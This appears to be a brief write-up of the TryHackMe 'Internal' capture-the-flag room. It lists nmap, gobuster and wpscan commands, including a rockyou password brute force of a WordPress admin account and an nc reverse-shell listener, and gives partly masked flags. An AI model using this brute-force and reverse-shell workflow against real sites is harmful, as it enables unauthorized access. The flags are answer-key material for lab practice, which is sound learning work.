...
```
bibo318@parrot:~/CTFs/tryhackme/Internal$ sudo nmap -A -sS -sC -sV -O 10.10.1.37
...
```
bibo318@parrot:~/CTFs/tryhackme/Internal$ gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/Internal$ wpscan --url http://internal.thm/blog -e u
...
```
bibo318@parrot:~/CTFs/tryhackme/Internal$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
...
```
bibo318@parrot:~/CTFs/tryhackme/Internal$ nc -lnvp 9001
...
cat user.txt
THM{V0N318*****int3rna1_fl4g_1}
aubreanna@internal:~$
```

1. User.txt Flag

`THM{V0N318*****int3rna1_fl4g_112**123:))}`

2. Root.txt Flag

`THM{V0N318*****d0ck3r_d3str0y3r12**123:))}`
